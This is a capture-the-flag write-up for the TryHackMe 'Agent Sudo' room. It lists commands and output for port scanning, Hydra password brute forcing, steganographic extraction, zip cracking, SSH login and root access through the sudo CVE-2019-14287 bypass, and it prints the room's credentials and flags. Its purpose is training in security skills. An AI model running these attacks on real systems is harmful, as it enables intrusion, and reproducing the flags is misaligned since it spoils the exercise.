

# 🕵️ TryHackMe: Agent Sudo — Complete Writeup

## 📌 Overview

This room demonstrates a full attack chain involving:

* Web exploitation (User-Agent manipulation)
* Credential brute forcing
* Steganography & file extraction
* OSINT (reverse image search)
* Privilege escalation (sudo misconfiguration)

---

# 🔍 1. Reconnaissance

We started with a full port scan:

```bash
rustscan -a <target_ip> -r 1-65535
```


### 📌 Open Ports:

* **21** → FTP (vsftpd 3.0.3)
* **22** → SSH (OpenSSH 7.6)
* **80** → HTTP (Apache)
                      
---

# 🌐 2. Web Enumeration

Accessing the web server:

```
http://<target_ip>
```

We found the message:

```
Dear agents,
Use your own codename as user-agent to access the site.
From, Agent R
```

---

# 🧠 3. User-Agent Manipulation

We tested different User-Agents:

```bash
for i in {A..Z}; do
  echo -e "\n===== Testing Agent $i ====="
  curl -s -A "$i" -L http://<target_ip>
done
```

### 🎯 Result:

For **Agent C**:

```
Attention chris,

Do you still remember our deal?
Also, change your password, it is weak!
```

👉 Extracted:

* **Username:** `chris`

---

# 🔐 4. Brute Force FTP Credentials

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt -t 50 ftp://<target_ip>
```

### 🎯 Credentials:

```
chris : crystal
```

---

# 📂 5. FTP Access

```bash
ftp <target_ip>
username : chris
passwd: crystal
```

### 📁 Files Found:

```
To_agentJ.txt
cute-alien.jpg
cutie.png
```

---

# 📜 6. Analyze Text File

```bash
cat To_agentJ.txt
```

### 📄 Output:

```
Your login password is somehow stored in the fake picture.
```

👉 Indicates **steganography**

---

# 🔍 7. Metadata Analysis

```bash
exiftool cutie.png
```

### 📌 Key Finding:

```
Warning: Trailer data after PNG IEND chunk
```

👉 Hidden data appended → possible embedded file

---

# 🧪 8. Extract Hidden Data

```bash
binwalk -e cutie.png
```

### 📌 Found:

* Embedded ZIP file at offset `34562`

---

# 🔧 9. Manual Extraction

```bash
dd if=cutie.png of=hidden.zip bs=1 skip=34562
```

---

# 🔐 10. Crack ZIP Password

```bash
zip2john hidden.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### 🎯 Password:

```
alien
```

---

# 📜 11. Extract ZIP

```bash
7z x hidden.zip
cat To_agentR.txt
```

### 📄 Output:

```
QXJlYTUx
```

---

# 🔓 12. Decode Base64

```bash
echo QXJlYTUx | base64 -d
```

### 🎯 Result:

```
Area51
```

---

# 🖼️ 13. Steganography Extraction

```bash
steghide extract -sf cute-alien.jpg
```

### 📦 Extracted:

```
message.txt
```

---

# 📜 14. Get Credentials

```bash
cat message.txt
```

### 🎯 Credentials:

```
james : hackerrules
```

---

# 💻 15. SSH Access

```bash
ssh james@<target_ip>
```

---

# 🏁 16. User Flag

```bash
cat user_flag.txt
```

### 🎯 Flag:

```
b03d975e8c92a7c04146cfa7a5a313c7
```

---

# 🌍 17. OSINT (Reverse Image Search)

Host image:

```bash
python3 -m http.server 8000
```

Access:

```
http://<target_ip>:8000/Alien_autospy.jpg
```

Upload to:

* [https://tineye.com](https://tineye.com)

### 🎯 Result:

```
Roswell Alien Autopsy
```

---

# ⚡ 18. Privilege Escalation

```bash
sudo -l
```

### 📌 Output:

```
(ALL, !root) /bin/bash
```

---

# 💥 Exploit (CVE-2019-14287)

```bash
sudo -u#-1 /bin/bash
```

### 🎯 Result:

```
root access gained
```

---

# 🏆 19. Root Flag

```bash
cat /root/root.txt
```

### 🎯 Flag:

```
b53a02f55b57d4439e3341834d70c062
```

---

# 🔥 Key Takeaways

* User-Agent header manipulation
* Password brute forcing (Hydra)
* Steganography (binwalk, steghide)
* OSINT techniques
* Privilege escalation via **CVE-2019-14287**

---

# 🧠 Skills Gained

* Web enumeration
* Credential attacks
* File carving & analysis
* Steganography
* Linux privilege escalation

---

# 🚀 Tools Used

* RustScan
* Nmap
* Curl
* Hydra
* Binwalk
* John the Ripper
* Steghide
* SSH

---

# 🏁 Conclusion

This room demonstrates a full real-world attack chain:

> **Recon → Exploitation → Post-Exploitation → Privilege Escalation**


